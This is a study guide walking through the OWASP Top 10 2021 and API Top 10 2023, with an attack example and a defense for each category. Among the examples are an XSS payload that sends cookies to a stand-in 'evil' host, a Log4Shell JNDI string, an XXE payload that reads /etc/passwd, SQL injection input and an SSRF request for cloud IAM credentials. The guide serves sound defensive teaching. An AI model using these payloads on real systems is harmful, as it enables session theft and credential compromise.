# OWASP Top 10 & API Security Top 10 Walkthrough

The **OWASP Top 10** is a periodically updated *awareness document* that ranks the ten
most critical **web application** security risk categories. It is not a checklist or a
standard — it is a starting point that says "if you fix nothing else, fix these classes
of problem." The current edition is **OWASP Top 10 2021** (the 2017 edition preceded it;
a 2025 edition is in progress at time of writing). This topic walks each 2021 category
with a **concrete example + defense**, explains **how the list is built** and **what
moved/merged** since 2017, and then *references* the separate **OWASP API Security Top 10
2023** without duplicating it (the `rest-api-design` topic owns the API list in depth).

> [!KEY-TAKEAWAY]
> The Top 10 is organized around **root-cause CWE groupings**, not individual bugs. Each
> "category" (e.g. A01 Broken Access Control) is a *bucket* of mapped CWEs. Interviewers
> want you to name the category, give a concrete attack, and give the *primary* defense —
> not recite all ten from memory in order.

> [!INTERVIEW]
> The highest-signal facts to have ready: **A01 Broken Access Control is now #1** (up from
> #5) and is the most prevalent category; **A03 Injection now includes XSS**; **A04
> Insecure Design and A10 SSRF are new in 2021** (SSRF was community/survey-voted); the
> old **Insecure Deserialization folded into A08 Software & Data Integrity Failures**; and
> **XXE folded into A05 Security Misconfiguration**. Know the *primary* defense per item.

The mnemonic list (2021):

| ID | Category | vs 2017 |
|---|---|---|
| A01 | Broken Access Control | ↑ from #5 (now #1) |
| A02 | Cryptographic Failures | renamed from "Sensitive Data Exposure" (#3), root-cause framing |
| A03 | Injection | ↓ from #1; **XSS merged in** |
| A04 | Insecure Design | **NEW** |
| A05 | Security Misconfiguration | ↑ from #6; **XXE merged in** |
| A06 | Vulnerable & Outdated Components | ↑ from #9 ("Using Components with Known Vulnerabilities") |
| A07 | Identification & Authentication Failures | renamed from "Broken Authentication" (#2), moved down |
| A08 | Software & Data Integrity Failures | **NEW**; **Insecure Deserialization** (2017 #8) merged in |
| A09 | Security Logging & Monitoring Failures | ↑ from #10 |
| A10 | Server-Side Request Forgery (SSRF) | **NEW** (community survey) |

---

## How the Top 10 is built and what changed since 2017

The list is assembled from **two inputs**, and this two-input methodology is a favorite
interview probe:

1. **Contributed data (8 of 10 categories).** Organizations submit vulnerability data
   across a large corpus of applications (the 2021 edition drew on data covering
   ~500,000 applications and testing against **~400 CWEs**, grouped into categories). For
   each CWE, OWASP computes the **incidence rate** — the percentage of *applications* with
   at least one instance of that CWE — rather than raw frequency of findings. This
   deliberately reduces bias from automated tools that report huge counts of a single
   easy-to-find bug.
2. **Industry survey (2 of 10 categories).** Two slots are chosen by a community survey of
   practitioners, to capture risks that are **hard to test for automatically** and so are
   under-represented in tool data but well-known to be dangerous. In 2021 these were
   **A04 Insecure Design** and **A10 SSRF**.

Each category is scored on eight factors: the eight data factors (incidence,
weighted exploitability, weighted impact, coverage, etc.) plus the survey. OWASP
publishes, per category, average **weighted exploitability** and **weighted (technical)
impact** derived from the CVSS-style scores attached to mapped CWEs, plus max/avg
incidence rates.

**What moved/merged 2017 → 2021 (the story to tell):**

- **Broken Access Control** jumped from #5 to **#1** — 94% of tested apps had some form of
  it; it also carries the most CWE instances of any category. Authorization is hard and
  broadly broken.
- **Sensitive Data Exposure → Cryptographic Failures (A02).** Renamed to describe the
  *root cause* (crypto done wrong or not at all) rather than the *symptom* (data leaked).
- **Injection dropped to #3 and absorbed XSS.** XSS is injection into an HTML/JS
  interpreter, so it now lives inside A03.
- **XXE (XML External Entities, 2017 #4) merged into A05** Security Misconfiguration
  (it is fundamentally a misconfigured/default-enabled XML parser feature).
- **Insecure Deserialization (2017 #8) merged into A08** Software & Data Integrity
  Failures, broadening the theme to CI/CD and supply-chain integrity.
- **A04 Insecure Design and A10 SSRF are new**, reflecting a shift toward "shift-left"
  secure design and the rise of SSRF in cloud/metadata-endpoint environments.

> [!TIP]
> When asked "is the Top 10 a compliance standard?" the correct answer is **no** — it is
> an awareness document. For a *verifiable requirements standard* point to **OWASP ASVS**
> (Application Security Verification Standard); for testing methodology point to the
> **WSTG** (Web Security Testing Guide).

---

## A01:2021 – Broken Access Control

**Definition.** Access control (authorization) enforces *what an authenticated principal
is allowed to do*. It is **broken** when the server fails to enforce those limits, letting
a user act outside their intended permissions — reading/modifying other users' data,
escalating to admin, or invoking functions they shouldn't.

**Why #1.** It was found in ~94% of applications tested and maps the most CWE instances.
Authorization is application-specific, hard to test automatically, and easy to forget on
even one endpoint.

**Concrete example — IDOR / BOLA (object-level).** The classic *Insecure Direct Object
Reference*, called **BOLA (Broken Object Level Authorization)** in the API world:

```
GET /api/invoices/1001    Authorization: Bearer <alice's token>   → 200 (Alice's invoice)
GET /api/invoices/1002    Authorization: Bearer <alice's token>   → 200 (BOB's invoice!)
```

The server looks up the object by the ID in the URL but never checks that the object
*belongs to the caller*. Incrementing the ID walks through everyone's data.

**Other forms:** privilege escalation (regular user reaches `POST /admin/*`), **forced
browsing** to unlinked pages, **metadata/JWT tampering** (changing `role: user` to
`role: admin`), **missing function-level access control**, CORS misconfiguration exposing
APIs, and *elevation by verb* (an endpoint allows `PUT`/`DELETE` from users who should
only `GET`).

**Primary defense.**
- **Deny by default** — everything is forbidden unless explicitly granted.
- Enforce authorization **server-side**, on **every request**, based on the
  **authenticated session/token identity — never on a client-supplied ID or role field**.
  For every object access, check "does *this principal* own / have permission on *this
  object*?" (ownership check), not just "is the object ID valid?".
- Centralize the access-control mechanism and reuse it; don't reimplement per handler.
- Use **unguessable references where feasible** (but note: random IDs are *defense in
  depth*, not a substitute for the ownership check — an ID that leaks still needs a check).
- Rate-limit and log access-control failures; invalidate sessions/tokens server-side on
  logout.

> [!WARNING]
> Replacing sequential IDs with UUIDs does **not** fix IDOR — it only makes enumeration
> harder. The real fix is the per-request **ownership/permission check**. Interviewers
> often plant "we switched to UUIDs" as a wrong answer.

---

## A02:2021 – Cryptographic Failures

**Definition.** Renamed from "Sensitive Data Exposure," A02 covers failures related to
**cryptography (or its absence)** that lead to exposure of sensitive data (PII,
credentials, health/financial data) or auth bypass. The rename shifts focus from the
*symptom* (exposed data) to the *root cause* (bad or missing crypto).

**Concrete examples.**
- **Data in transit unencrypted or downgradable** — plaintext HTTP, or TLS present but no
  `Strict-Transport-Security` (HSTS), allowing SSL-strip downgrade.
- **Data at rest unencrypted**, or encrypted with hard-coded/weak keys.
- **Weak algorithms:** using **MD5 or SHA-1** (both broken for collision resistance;
  MD5 collisions are trivial, SHA-1 broken by SHAttered 2017), **DES/3DES**, RC4, or
  **ECB mode** (identical plaintext blocks → identical ciphertext blocks; the "ECB
  penguin" leaks structure).
- **Fast hashes for passwords** — SHA-256 of a password is a cryptographic failure;
  passwords need a **slow, salted KDF** (bcrypt / scrypt / **Argon2id** / PBKDF2).
- **Unauthenticated encryption** — CBC without a MAC enables padding-oracle attacks; use
  **AEAD (AES-GCM / ChaCha20-Poly1305)**.
- **Predictable IVs/nonces / reusing a nonce** with a stream/GCM mode (catastrophic — key
  recovery for GCM auth).

**Primary defense.**
- Classify data; **don't store what you don't need**.
- **Encrypt in transit (TLS 1.2+/1.3) with HSTS**, and encrypt sensitive data at rest.
- Use **strong, current primitives**: AES-256-GCM or ChaCha20-Poly1305 (AEAD), SHA-256/
  SHA-3 for integrity hashing, Argon2id/bcrypt/scrypt/PBKDF2 for passwords, and proper
  key management (rotation, KMS/HSM, no keys in source). See `cryptography-foundations`
  and `password-storage-and-credential-security` for the primitives.
- Ensure randomness comes from a **CSPRNG**, never `rand()`/`Math.random()`.

> [!KEY-TAKEAWAY]
> "Cryptographic failure" ≠ "the algorithm was broken." Far more often it is **using the
> right tool wrong**: no encryption at all, encryption without authentication, a fast hash
> for passwords, reused nonces, or a key checked into git.

---

## A03:2021 – Injection

**Definition.** Injection occurs when untrusted input is sent to an **interpreter** (SQL,
NoSQL, OS shell, LDAP, XPath, or an **HTML/JS interpreter** for XSS) such that the input
breaks out of its data context and is executed as code/structure. **In 2021, XSS was
merged into A03** because it is injection into the browser's HTML/JS interpreter.

**Concrete example — SQL injection.**
```sql
-- vulnerable: string concatenation
"SELECT * FROM users WHERE name = '" + input + "'"
-- input:  ' OR '1'='1
SELECT * FROM users WHERE name = '' OR '1'='1'   -- returns all rows
```
**XSS example (reflected):** `https://site/search?q=<script>document.location='https://evil/?c='+document.cookie</script>`
— if the app echoes `q` into the page unescaped, the script runs in the victim's origin
and steals their session cookie.

**Primary defense.**
- **Parameterized queries / prepared statements** (bind variables) for SQL — the query
  *structure* and *data* travel on separate channels so data is never reparsed as code.
  This is the primary fix; input validation and escaping are *defense in depth*.
- For OS commands, avoid the shell — pass an **argument array** to `exec` (no shell
  interpolation).
- For XSS, apply **context-aware output encoding** (HTML body vs attribute vs JS vs URL),
  use safe templating/auto-escaping, and add a strong **Content-Security-Policy** as
  defense in depth. (Full XSS/CSP detail lives in `xss-csp-and-security-headers`;
  server-side injection detail in `injection-attacks`.)
- Use **allowlist input validation** for structure you can't parameterize (e.g. sort
  column names, table identifiers).

---

## A04:2021 – Insecure Design

**Definition.** A **new 2021 category** covering flaws in the *design* of the system —
missing or ineffective security controls — as distinct from **implementation** defects.
"Insecure design" is a bug that no amount of perfect coding can fix, because the control
was never designed in. A05 (misconfiguration) is *"we built it right but set it up
wrong"*; A04 is *"we never designed the control at all."*

**Concrete examples.**
- A "recover password via security question" flow whose questions have publicly
  discoverable answers — the *design* is weak regardless of code quality.
- An e-commerce checkout with **no anti-automation** on buying limited-stock items,
  enabling scalper bots to drain inventory (a *business-logic* abuse).
- A cinema-booking system that lets you hold seats indefinitely with no limit, enabling
  denial of service by reservation.
- No segregation of tenants in a multi-tenant design.

**Primary defense.**
- **Threat modeling** early and continuously (STRIDE, attack trees) — ask "what can go
  wrong?" per feature during design. (See `security-fundamentals-and-threat-modeling`.)
- Establish and use a **secure development lifecycle (SDLC)** and a library of **secure
  design patterns / paved-road components**.
- Write **abuse cases / misuse cases** alongside user stories; define security
  requirements as first-class acceptance criteria.
- Enforce **business-logic limits** (max quantity, tenant isolation, rate/velocity
  controls) at the design level, and use **defense in depth**.

> [!INTERVIEW]
> The distinction interviewers want: **Insecure Design (A04) = missing/flawed control by
> design; Security Misconfiguration (A05) = a control exists but is set up wrong.** You
> can't "patch" an insecure design — you have to redesign. Threat modeling is the headline
> defense.

---

## A05:2021 – Security Misconfiguration

**Definition.** The application, framework, server, database, or cloud service is
deployed with **insecure settings** — defaults left on, unnecessary features enabled,
verbose errors, or missing hardening. **XXE (XML External Entities) merged into A05 in
2021** because it stems from a misconfigured/default-enabled XML parser.

**Concrete examples.**
- **Default credentials** (`admin/admin`), sample apps, or admin consoles left enabled.
- **Directory listing** on, **stack traces** returned to users (leaking versions/paths).
- **Missing security headers** (no HSTS, no CSP, no `X-Content-Type-Options: nosniff`).
- **Overly permissive CORS** (`Access-Control-Allow-Origin: *` with credentials).
- **Cloud storage misconfig** — a public S3 bucket exposing data.
- **XXE:** an XML parser that resolves external entities:
  ```xml
  <?xml version="1.0"?>
  <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
  <foo>&xxe;</foo>          <!-- parser reads /etc/passwd; can also SSRF -->
  ```

**Primary defense.**
- **Harden by default**: remove/disable unused features, sample apps, default accounts;
  minimal install.
- A **repeatable, automated hardening process** (infrastructure-as-code, hardened base
  images) so every environment is configured identically.
- Return **generic error messages**; log details server-side only.
- Send appropriate **security headers**; lock down CORS to explicit origins.
- **Disable DTD/external entity processing** in XML parsers to kill XXE (the primary XXE
  fix), or use less complex formats (JSON) where possible.
- Continuously **scan configurations** and verify in a review step.

---

## A06:2021 – Vulnerable and Outdated Components

**Definition.** Using components (libraries, frameworks, runtimes, OS packages,
containers) with **known vulnerabilities** or that are **unsupported/out of date**.
Renamed from 2017's "Using Components with Known Vulnerabilities." You inherit the
security posture of everything in your dependency tree, including **transitive** deps.

**Concrete examples.**
- **Log4Shell (CVE-2021-44228)** — a JNDI-lookup RCE in Log4j 2 triggered by logging an
  attacker-controlled string like `${jndi:ldap://evil/a}`; affected countless apps
  transitively.
- **Equifax (2017)** — an unpatched **Apache Struts** RCE (CVE-2017-5638) led to breach of
  ~147M records.
- Running an **end-of-life** framework/runtime that no longer receives security patches.

**Primary defense.**
- Maintain an **inventory / SBOM** (Software Bill of Materials) of all components and
  versions, including transitive dependencies.
- Use **Software Composition Analysis (SCA)** tools (e.g. dependency scanners) wired into
  CI to flag known-vulnerable versions against CVE/advisory feeds.
- **Patch promptly**; remove unused dependencies; obtain components only from official
  sources over secure links; prefer maintained, signed releases.
- Have a documented **patch-management process** and monitor advisories.

> [!TIP]
> This category is largely **not found by testing your own code** — it needs SCA and
> inventory. That's why "we do pen-testing" is not a sufficient answer for A06.

---

## A07:2021 – Identification and Authentication Failures

**Definition.** Renamed from "Broken Authentication" and moved down from #2 to #7 (partly
because standard frameworks now do auth better). Covers weaknesses in **confirming user
identity, authentication, and session management** — enabling credential attacks or
session takeover.

**Concrete examples.**
- **Credential stuffing / brute force** with no rate limiting or lockout — attackers
  replay breached username/password pairs.
- **Permitting weak or breached passwords** (e.g. `Password1`).
- **Weak credential recovery** ("knowledge-based" questions).
- **Session fixation** and **not rotating the session ID after login**.
- **Exposing session IDs in the URL**, or **not invalidating sessions/JWTs** on logout
  or timeout.
- **Missing or weak MFA.**

**Primary defense.**
- Implement **MFA** where possible (phishing-resistant WebAuthn/FIDO2 is strongest).
- Follow **NIST SP 800-63B**: check passwords against **breached-password lists**, allow
  long passphrases, **no forced periodic rotation or composition rules**, no password
  hints.
- **Rate-limit / throttle / lock** failed logins; alert on credential-stuffing patterns.
- **Generate new, high-entropy session IDs server-side after login** (kills fixation);
  store them in `Secure; HttpOnly; SameSite` cookies; expire and invalidate on logout.
- Use **generic error messages** ("invalid username or password") to prevent user
  enumeration. (Deep detail in `authentication-and-mfa` and
  `session-management-and-secure-cookies`.)

---

## A08:2021 – Software and Data Integrity Failures

**Definition.** A **new 2021 category** about code and infrastructure that fails to
protect against **integrity violations** — trusting data, updates, plugins, or CI/CD
pipelines without verifying they haven't been tampered with. **2017's Insecure
Deserialization is subsumed here.**

**Concrete examples.**
- **Insecure deserialization:** an app deserializes an attacker-controlled serialized
  object (Java `ObjectInputStream`, Python `pickle`, .NET `BinaryFormatter`, PHP
  `unserialize`) that triggers a "gadget chain," leading to **remote code execution**.
- **Unsigned/unverified auto-update:** an application downloads and runs updates without
  **verifying a digital signature** — attacker serves a malicious update.
- **CI/CD pipeline compromise / supply-chain attack:** the **SolarWinds** attack (2020)
  inserted the SUNBURST backdoor into the Orion build pipeline, so signed, "trusted"
  updates carried malware to ~18,000 customers. Also: pulling dependencies from untrusted
  registries, or a compromised build server injecting code.

**Primary defense.**
- **Never deserialize untrusted data** into complex objects; prefer data-only formats
  (JSON) with strict schemas; if unavoidable, use allowlists of expected types and
  integrity checks.
- **Digital signatures** to verify software/updates and critical data come from the
  expected source (verify before executing).
- Harden the **CI/CD pipeline**: least privilege, code review, integrity checks on the
  build, signed artifacts, and **verify dependencies** (checksums/signatures, lockfiles);
  ensure unsigned/unverified code can't be deployed.

> [!WARNING]
> Insecure deserialization is not "just A03." In 2021 it is part of **A08**. And the
> fix isn't "sanitize the serialized blob" — it's **don't deserialize untrusted input**
> (or verify integrity/signature first).

---

## A09:2021 – Security Logging and Monitoring Failures

**Definition.** Moved up from #10. Insufficient logging, monitoring, alerting, or incident
response means breaches go **undetected**. This category is about **detection and
response**, not prevention — but without it, attackers dwell for months.

**Concrete examples.**
- **Auditable events not logged** — logins, failed logins, high-value transactions,
  access-control failures produce no record.
- Logs stored **only locally**, easily wiped by the attacker, with **no alerting** on
  suspicious patterns (e.g. thousands of failed logins = credential stuffing goes
  unnoticed).
- Verified breaches historically took **~200+ days to detect** (industry dwell-time data),
  usually by an external party, not the victim.
- **Log injection / forging:** unescaped newlines in logged input let an attacker inject
  fake log lines (CRLF), or logging sensitive data (passwords, tokens) *into* the logs
  (which is itself a leak).

**Primary defense.**
- **Log security-relevant events** (auth successes/failures, access-control failures,
  input-validation failures, high-value actions) with enough context and a consistent
  format, and **ship them off-box** to a central, tamper-resistant store (SIEM).
- **Alert and monitor** in near real-time; define thresholds (e.g. N failed logins).
- Have an **incident response / recovery plan** (align with NIST 800-61).
- **Never log secrets/PII**; **sanitize/encode** logged input to prevent log injection.

> [!KEY-TAKEAWAY]
> A09 is the "you can't respond to what you can't see" category. Note the tension: log
> *enough* to detect and investigate, but **never log credentials, tokens, or PII**, and
> encode untrusted values to prevent log forging.

---

## A10:2021 – Server-Side Request Forgery (SSRF)

**Definition.** A **new 2021 category, added via the community survey.** SSRF occurs when
an application **fetches a URL supplied (or influenced) by the user** without validating
the destination, letting an attacker make the *server* send requests to targets the
attacker couldn't reach directly — internal services, cloud metadata endpoints, or
localhost admin ports.

**Concrete example — cloud metadata theft.** An app has a "fetch image from URL" feature:
```
POST /fetch  { "url": "https://example.com/logo.png" }
```
Attacker changes the URL to the **cloud metadata endpoint**:
```
POST /fetch  { "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/role" }
```
On IMDSv1 the server dutifully fetches it and returns **temporary IAM credentials** —
enabling full cloud account compromise (this class of attack drove the Capital One 2019
breach). SSRF also enables **internal port scanning**, hitting `http://localhost:8080/admin`,
and reading internal-only APIs.

**Primary defense.**
- **Allowlist** the schemes, hosts, and ports the server may fetch (deny by default);
  reject non-`http(s)`, redirects to disallowed hosts, and non-allowlisted destinations.
- **Block access to internal ranges and the metadata IP** (`169.254.169.254`, RFC 1918,
  loopback, link-local) at both the app and the network layer.
- **Do not send raw responses** back to the client; disable HTTP redirect following or
  re-validate after each redirect.
- Enforce network **egress segmentation** so the app server simply can't reach internal
  services; on AWS, **require IMDSv2** (session-token, hop-limit) to blunt metadata SSRF.
- Beware **DNS rebinding / TOCTOU** — validate the *resolved IP at connection time*, not
  just the hostname. (Deep detail in `ssrf-and-server-side-request-attacks`.)

---

## Referencing the API Security Top 10 (2023)

Because web APIs have a **different threat profile** than server-rendered web apps, OWASP
maintains a **separate list: the API Security Top 10** (current edition **2023**). This
walkthrough only **references** it — the `rest-api-design` topic owns the API list in
detail. What to know here:

- It is a **distinct, complementary** list, not a subset of the web Top 10.
- Its **#1 is API1:2023 Broken Object Level Authorization (BOLA)** — the same IDOR/
  object-ownership failure that dominates web **A01**, and consistently the top API risk.
- Authorization dominates: it also has **Broken Function Level Authorization** and (new in
  2023) **Broken Object Property Level Authorization** (which merged 2019's *Excessive Data
  Exposure* and *Mass Assignment*).
- Notable API-specific entries not called out separately in the web list: **Unrestricted
  Resource Consumption**, **Unrestricted Access to Sensitive Business Flows** (new 2023),
  **Improper Inventory Management** (shadow/zombie APIs), and **Unsafe Consumption of
  APIs** (trusting third-party APIs too much). **SSRF** appears on both lists.

> [!TIP]
> If asked "web Top 10 vs API Top 10," say: same *spirit* (root-cause categories from data
> + survey) but the API list emphasizes **object-/function-/property-level authorization,
> resource consumption, and inventory**, because APIs expose many fine-grained endpoints
> and object IDs directly to clients. Both put an authorization failure at #1.

---

## Common follow-up questions

- **"Is the OWASP Top 10 a standard you can certify against?"** No — it's an *awareness*
  document. For verifiable requirements use **ASVS**; for testing use the **WSTG**.
- **"Why did Broken Access Control move to #1?"** ~94% of tested apps had it and it maps
  the most CWE instances; authorization is app-specific and hard to test automatically.
- **"What's the difference between A04 Insecure Design and A05 Misconfiguration?"** A04 =
  a needed control was never designed in (can't be patched, must redesign); A05 = a
  control exists but is deployed with insecure/default settings.
- **"Where did XSS, XXE, and Insecure Deserialization go in 2021?"** XSS → A03 Injection;
  XXE → A05 Misconfiguration; Insecure Deserialization → A08 Integrity Failures.
- **"How are the two survey-selected categories chosen and why?"** By community vote, to
  surface risks that are hard to detect with automated tooling (2021: A04 and A10).
- **"What actually stops SQL injection?"** Parameterized queries/prepared statements
  (separate code and data channels); escaping/validation is defense in depth.
- **"How does SSRF lead to cloud account takeover?"** By reaching the metadata endpoint
  (`169.254.169.254`) to steal temporary IAM credentials — mitigated by IMDSv2 + egress
  controls + destination allowlisting.
- **"Why is SHA-256(password) a cryptographic failure?"** It's a *fast* hash — attackers
  compute billions/sec. Passwords need a slow, salted KDF (Argon2id/bcrypt/scrypt/PBKDF2).
- **"What defends A06 that pen-testing your own code won't?"** SBOM + Software Composition
  Analysis against CVE feeds; you inherit vulns from transitive dependencies.
- **"How does A08 relate to SolarWinds?"** A compromised CI/CD build pipeline shipped a
  signed-but-backdoored update — an integrity failure; defense is pipeline hardening,
  artifact signing, and dependency verification.

## References

- OWASP Top 10 2021 — <https://owasp.org/Top10/> (per-category pages A01–A10)
- OWASP Top 10 2021 "About / How data is used" & methodology —
  <https://owasp.org/Top10/A00_2021_Introduction/>
- OWASP API Security Top 10 2023 — <https://owasp.org/API-Security/editions/2023/en/0x00-header/>
- OWASP Application Security Verification Standard (ASVS) — <https://owasp.org/www-project-application-security-verification-standard/>
- OWASP Web Security Testing Guide (WSTG) — <https://owasp.org/www-project-web-security-testing-guide/>
- OWASP Cheat Sheet Series — <https://cheatsheetseries.owasp.org/>
- CWE list (MITRE) — <https://cwe.mitre.org/>
- NIST SP 800-63B Digital Identity (authentication) — <https://pages.nist.gov/800-63-3/sp800-63b.html>
- NIST SP 800-61 Computer Security Incident Handling — <https://csrc.nist.gov/pubs/sp/800/61/r2/final>
- CVE-2021-44228 (Log4Shell); CVE-2017-5638 (Apache Struts / Equifax) — <https://cve.mitre.org/>
